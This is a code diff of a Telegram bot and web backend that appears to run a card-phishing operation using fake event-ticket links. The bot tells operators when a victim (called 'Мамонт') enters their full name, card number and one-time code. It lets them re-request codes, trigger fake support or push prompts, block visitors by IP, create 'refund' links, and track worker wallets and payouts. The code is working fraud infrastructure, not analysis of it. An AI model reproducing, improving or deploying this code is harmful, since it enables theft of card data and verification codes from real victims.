+            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        except Exception as e:
+            print(f"[ERROR] Не вдалося надіслати ФИО admin_user_id: {e}")
+            import traceback
+            traceback.print_exc()
+        try:
+            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+        except Exception as e:
+            print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
+            import traceback
+            traceback.print_exc()
         if code:
-            await bot.send_message(admin_user_id, msg3)  # без кнопок
+            try:
+                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+            except Exception as e:
+                print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
+                import traceback
+                traceback.print_exc()
 
 @log_function
 async def code_notify(request):
@@ -1597,13 +1822,33 @@ async def code_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, text)  # без кнопок
+        await bot.send_message(admin_user_id, 'Мамонт ввёл код')
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
-@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or c.data.startswith('code_request_again:')))
+@router.callback_query(lambda c: c.data and (
+    c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or
+    c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or
+    c.data.startswith('code_request_again:')
+    or c.data.startswith('push:')
+))
 async def admin_action_handler(call: types.CallbackQuery):
-    action, ip = call.data.split(':', 1)
+    parts = call.data.split(':')
+    action = parts[0]
+    ip = parts[1] if len(parts) > 1 else None
+    page_code = parts[2] if action == 'push' and len(parts) > 2 else None
+    if action == 'push':
+        print(f'[DEBUG] admin_action_handler: push page_code={page_code}, ip={ip}, data={call.data}')
+        import aiohttp as aiohttp_client
+        async with aiohttp_client.ClientSession() as session:
+            print(f'[DEBUG] Sending push to http://127.0.0.1:8080/set_push_flag, page_code={page_code}')
+            try:
+                resp = await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
+                print(f'[DEBUG] Push response: {resp.status} {await resp.text()}')
+            except Exception as e:
+                print(f'[DEBUG] Push request failed: {e}')
+        await call.answer("Push notification sent")
+        return
     import aiohttp as aiohttp_client
     async with aiohttp_client.ClientSession() as session:
         await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
@@ -1614,20 +1859,49 @@ async def admin_action_handler(call: types.CallbackQuery):
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
     elif action == 'support':
-        # Надсилаємо POST на /set_support_flag
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
         await call.answer("Введіть текст повідомлення:")
-        user_step[call.from_user.id] = f'text_for_{ip}'
+        user_step[call.from_user.id] = f'text_for_{ip}'; return
     elif action == 'code_request_again':
-        # Надсилаємо POST на /set_request_again з кодом
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
+    elif action == 'push':
+        if page_code:
+            await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
+        else:
+            print('[push] No page_code provided!')
+        await call.answer("Push notification sent")
+    # НЕ змінюємо клавіатуру!
+    await call.answer()
 
 
+
+@router.callback_query(lambda c: c.data.startswith('ban:'))
+async def ban_reason_ask(call: types.CallbackQuery):
+    uid = call.from_user.id
+    target_id = int(call.data.split(':', 1)[1])
+    user_data[uid] = {'ban_target': target_id}
+    user_step[uid] = 'ban_reason'
+    await call.message.answer("Введите причину блокировки:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "change_nickname")
+async def change_nickname_start(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'change_nickname'
+    await call.message.answer("Введите новый псевдоним:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "change_wallet")
+async def change_wallet_start(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'change_wallet'
+    await call.message.answer("Введите новый кошелек:")
+    await call.answer()
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 @log_function
@@ -1666,12 +1940,18 @@ async def cors_middleware(request, handler):
 
 @log_function
 async def latest_event_data(request):
+    page_code = request.query.get('page', '') or request.query.get('e', '')
+    if not page_code:
+        print("[API] No page_code provided")
+        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+    
+    print(f"[API] Requesting data for page_code: {page_code}")
     c = conn.cursor()
-    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price FROM site_users ORDER BY created_at DESC LIMIT 1')
+    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price FROM site_users WHERE page_code=?', (page_code,))
     row = c.fetchone()
     if not row:
-        print("[API] No data found in site_users table")
-        return web.json_response({'error': 'no data'})
+        print(f"[API] No data found for page_code: {page_code}")
+        return web.json_response({'error': 'page_code not found'}, status=404)
     
     data = {
         'dates': [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]],
@@ -1679,7 +1959,7 @@ async def latest_event_data(request):
         'street': row[9],
         'price': row[10]
     }
-    print(f"[API] Returning data: {data}")
+    print(f"[API] Returning data for page_code {page_code}: {data}")
     return web.json_response(data)
 
 @log_function
@@ -1724,9 +2004,27 @@ async def event_address(request):
 @log_function
 async def data_by_ip(request):
     ip = request.query.get('ip', '')
+    page_code = request.query.get('page', '') or request.query.get('e', '')
+    
     if not ip:
         return web.json_response({'error': 'missing ip'}, status=400)
+    
     c = conn.cursor()
+    
+    # Якщо є page_code, використовуємо його для точного знаходження події
+    if page_code:
+        print(f"[DEBUG] data_by_ip with page_code: {page_code}, ip: {ip}")
+        c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            price, currency, street = row
+            print(f"[DEBUG] Found data by page_code: price={price}, currency={currency}, street={street}")
+            return web.json_response({'price': price, 'currency': currency, 'street': street})
+        else:
+            print(f"[DEBUG] No data found for page_code: {page_code}")
+    
+    # Fallback: використовуємо IP для знаходження останньої події (для старих посилань)
+    print(f"[DEBUG] data_by_ip fallback to IP lookup: {ip}")
     c.execute('SELECT id FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
     row = c.fetchone()
     if not row:
@@ -1737,6 +2035,7 @@ async def data_by_ip(request):
     if not row2:
         return web.json_response({'error': 'data not found'}, status=404)
     price, currency, street = row2
+    print(f"[DEBUG] Found data by IP: price={price}, currency={currency}, street={street}")
     return web.json_response({'price': price, 'currency': currency, 'street': street})
 
 @log_function
@@ -1792,22 +2091,24 @@ async def user_id_by_page_code(request):
 async def payment_data(request):
     try:
         page_code = request.query.get('page', '')
+        code = request.query.get('e', '')
+        c = conn.cursor()
+        if code:
+            c.execute('SELECT price, currency FROM refund_links WHERE code=?', (code,))
+            row = c.fetchone()
+            if row:
+                price, currency = row
+                return web.json_response({'price': price, 'currency': currency})
         if not page_code:
             return web.json_response({'error': 'missing page'}, status=400)
-        
         print(f"[DEBUG] payment_data request for page_code: {page_code}")
-        
-        c = conn.cursor()
         c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
         row = c.fetchone()
-        
         if not row:
             print(f"[DEBUG] No record found for page_code: {page_code}")
             return web.json_response({'error': 'not found'}, status=404)
-        
         price, currency, street = row
         print(f"[DEBUG] Found data: price={price}, currency={currency}, street={street}")
-        
         return web.json_response({'price': price, 'currency': currency, 'address': street})
     except Exception as e:
         print(f"[ERROR] payment_data error: {e}")
@@ -1858,10 +2159,17 @@ def set_event_places(page_code, event_index, places):
 async def event_places_api(request):
     page_code = request.query.get('page', '')
     event_index = int(request.query.get('event', '0'))
+    
+    if not page_code:
+        print("[API] No page_code provided for event_places_api")
+        return web.json_response({'error': 'missing page parameter'}, status=400)
+    
+    print(f"[API] Requesting places for page_code: {page_code}, event_index: {event_index}")
     c = conn.cursor()
     c.execute('SELECT places FROM event_places WHERE page_code=? AND event_index=?', (page_code, event_index))
     row = c.fetchone()
     if not row:
+        print(f"[API] No places data found for page_code: {page_code}, event_index: {event_index}")
         return web.json_response({'places': 0})
     return web.json_response({'places': row[0]})
 
@@ -1869,10 +2177,17 @@ async def event_places_api(request):
 async def event_date_api(request):
     page_code = request.query.get('page', '')
     event_index = int(request.query.get('event', '0'))
+    
+    if not page_code:
+        print("[API] No page_code provided for event_date_api")
+        return web.json_response({'error': 'missing page parameter'}, status=400)
+    
+    print(f"[API] Requesting date for page_code: {page_code}, event_index: {event_index}")
     c = conn.cursor()
     c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8 FROM site_users WHERE page_code=?', (page_code,))
     row = c.fetchone()
     if not row:
+        print(f"[API] No date data found for page_code: {page_code}")
         return web.json_response({'date': ''})
     if 0 <= event_index < 8:
         return web.json_response({'date': row[event_index].split(' ')[0] if row[event_index] else ''})
@@ -1882,17 +2197,206 @@ async def event_date_api(request):
 async def event_time_api(request):
     page_code = request.query.get('page', '')
     event_index = int(request.query.get('event', '0'))
+    
+    if not page_code:
+        print("[API] No page_code provided for event_time_api")
+        return web.json_response({'error': 'missing page parameter'}, status=400)
+    
+    print(f"[API] Requesting time for page_code: {page_code}, event_index: {event_index}")
     c = conn.cursor()
     c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8 FROM site_users WHERE page_code=?', (page_code,))
     row = c.fetchone()
     if not row:
+        print(f"[API] No time data found for page_code: {page_code}")
         return web.json_response({'time': ''})
-    if 0 <= event_index < 8:
-        if row[event_index] and ' ' in row[event_index]:
-            return web.json_response({'time': row[event_index].split(' ', 1)[1]})
-        else:
-            return web.json_response({'time': ''})
+    if 0 <= event_index < 8 and row[event_index]:
+        time_part = row[event_index].split(' ')[1] if ' ' in row[event_index] else ''
+        return web.json_response({'time': time_part})
     return web.json_response({'time': ''})
+
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_amount')
+@ban_guard
+async def admin_pay_amount(message: types.Message):
+    # ...існуючий код...
+    user_step[uid] = None
+
+@router.message(lambda m: is_admin(m.from_user.id) and m.text and any(x in m.text.lower() for x in ["назад", "back"]))
+@ban_guard
+async def force_admin_back(message: types.Message):
+    uid = message.from_user.id
+    user_step[uid] = 'admin_panel'
+    await message.answer("Повернення в адмін-панель.", reply_markup=admin_panel_kb)
+    return
+
+# Додаємо лічильник спроб для manual_payment_amount
+manual_payment_attempts = {}
+
+
+@router.message(lambda m: m.text and ("назад" in m.text.lower() or "⬅️" in m.text.lower()))
+@ban_guard
+async def universal_back_handler(message: types.Message):
+    uid = message.from_user.id
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    user_step[uid] = None
+    await message.answer("Возврат в главное меню.", reply_markup=kb)
+
+
+
+
+# --- Хендлер для 'Назад' у edit_places_choose_ ---
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_edit_places_choose(message: types.Message):
+    print("==> back_from_edit_places_choose")
+    state = user_step.get(message.from_user.id, '')
+    page_code = state.replace('edit_places_choose_', '')
+    kb = ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="Изменить данные")],
+            [KeyboardButton(text="Изменить места")],
+            [KeyboardButton(text="Удалить ссылку")],
+            [KeyboardButton(text="Назад")]
+        ],
+        resize_keyboard=True
+    )
+    await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
+    user_step[message.chat.id] = f'edit_link_menu_{page_code}'
+
+# --- Хендлер для 'Назад' у edit_link_menu_ ---
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_edit_link_menu(message: types.Message):
+    print("==> back_from_edit_link_menu")
+    c = conn.cursor()
+    c.execute('SELECT page_code FROM site_users ORDER BY created_at DESC LIMIT 50')
+    codes = [row[0] for row in c.fetchall() if row[0]]
+    kb = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text=f"?page={code}")] for code in codes] + [[KeyboardButton(text="Назад")]],
+        resize_keyboard=True
+    )
+    await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
+    user_step[message.chat.id] = 'choose_link_to_edit'
+
+# --- Хендлер для 'Назад' у choose_link_to_edit ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'choose_link_to_edit' and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_choose_link_to_edit(message: types.Message):
+    print("==> back_from_choose_link_to_edit")
+    kb = ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="Создать ссылку")],
+            [KeyboardButton(text="Изменить ссылки")],
+            [KeyboardButton(text="Назад")]
+        ],
+        resize_keyboard=True
+    )
+    await message.answer("Выберите действие:", reply_markup=kb)
+    user_step[message.chat.id] = 'links_menu'
+
+# --- Хендлер для 'Назад' у links_menu ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'links_menu' and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_links_menu(message: types.Message):
+    print("==> back_from_links_menu")
+    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+    await message.answer("Главное меню:", reply_markup=kb)
+    user_step[message.chat.id] = None
+
+# --- Універсальний хендлер для 'Назад', який не спрацьовує у вкладених меню ---
+@router.message(
+    lambda m: (
+        m.text and m.text.lower() == 'назад'
+        and not (
+            (user_step.get(m.from_user.id, '') or '').startswith('edit_link_menu_') or
+            (user_step.get(m.from_user.id, '') or '').startswith('edit_places_choose_') or
+            user_step.get(m.from_user.id) == 'choose_link_to_edit' or
+            user_step.get(m.from_user.id) == 'links_menu'
+        )
+    )
+)
+@ban_guard
+async def universal_back_handler(message: types.Message):
+    print("==> universal_back_handler")
+    uid = message.from_user.id
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    user_step[uid] = None
+    if message.chat.type == "private":
+        await message.answer("Возврат в главное меню.", reply_markup=kb)
+    else:
+        await message.answer("Возврат в главное меню.")
+
+
+
+# --- Універсальний callback_query-хендлер тільки для кнопок "Назад" ---
+@router.callback_query(lambda c: c.data in ["back_to_menu", "payuser_back", "pay_back", "ban_back", "tickets_cancel"])
+async def universal_inline_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    
+    # Специальная обработка для tickets_cancel
+    if call.data == "tickets_cancel":
+        await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
+    else:
+        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    
+    await call.answer()
+
+
+
+
+@router.message(lambda m: m.text == "⬅️ Назад")
+async def back_to_main_menu(message: types.Message):
+    uid = message.from_user.id
+    user_step[uid] = None
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await message.answer("Возврат в главное меню.", reply_markup=kb)
+
+
+
+
+
+
+# --- Універсальний callback_query-хендлер для всіх inline-кнопок ---
+# Видалено, щоб не перехоплювати всі inline-кнопки
+
+# --- Додаємо глобальний dict для списку повідомлень з кнопками ---
+bot_message_ids = {}
+
+
+
+# --- Універсальний хендлер для '⬅️ Назад' у будь-якому стані ---
+@router.message(lambda m: m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
+@ban_guard
+async def force_back_to_main(message: types.Message):
+    uid = message.from_user.id
+    current_step = user_step.get(uid)
+    print(f"[DEBUG] force_back_to_main called for user {uid}, text: {message.text!r}, current_step: {current_step}")
+    
+    # Не обробляємо, якщо користувач знаходиться в payment_type_selection
+    if current_step == 'payment_type_selection':
+        print(f"[DEBUG] Skipping force_back_to_main for payment_type_selection")
+        return
+    
+    user_step[uid] = None
+    print(f"[DEBUG] force_back_to_main: user_step set to None, text={message.text!r}")
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await message.answer("Повернення в головне меню.", reply_markup=kb)
+    print(f"[DEBUG] force_back_to_main: user_step={user_step.get(uid)}")
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel' and m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
+@ban_guard
+async def admin_panel_back(message: types.Message):
+    uid = message.from_user.id
+    user_step[uid] = None
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await message.answer("", reply_markup=kb)
+    print(f"[DEBUG] admin_panel_back: user_step={user_step.get(uid)}")
+
+
+
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
@@ -1920,6 +2424,5 @@ if __name__ == '__main__':
         # aiogram polling
         await dp.start_polling(bot)
     asyncio.run(main())
-
 
 
